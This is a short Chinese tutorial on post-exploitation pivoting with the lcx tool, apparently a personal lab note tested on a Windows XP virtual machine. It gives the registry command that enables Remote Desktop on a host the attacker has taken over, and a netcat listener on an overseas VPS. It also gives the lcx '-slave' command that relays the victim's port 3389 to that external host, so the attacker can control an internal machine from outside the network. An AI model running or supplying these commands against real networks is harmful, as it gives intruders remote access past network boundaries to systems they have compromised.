lcx内网端口转发

参考：内网转发

\

:::
:::

lcx的使用：当拿到一个处于内网主机的管理员权限，打开它的3389端口，映射到外网某公网IP的地址上。

这样，我们操作外网机子，就相当于操作内网主机，很方便。

试验下：windowsxp
假设它是内网主机（使用host-only模式），它没有公网IP，它的内网IP是
192.168.57.129（网关192.168.60.100）

\

:::
:::

\

网络拓扑图
:::
:::

内网主机开启3389端口：

REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v
fDenyTSConnections /t REG_DWORD /d 00000000 /f

查看VPS（是购买的国外的服务器）可以用来监听的端口，选择一个没有使用的端口，比如9977。

\

:::
:::

外网主机，安装netcat

apt-get -y install nc

nc -l -p 9977 （在9977端口监听）

在内网主机上，命令”lcx.exe -slave 104.xx.xx.xx 9977 192.168.60.130 3389
“

总结：

lcx.exe -lister 外网端口 内网端口         
 （在本地主机执行，用nc监听端口也可以）

lcx.exe -slave 104.xx.xx.xx 9977 192.168.60.130 3389 
 （在目标主机上执行，转发端口）
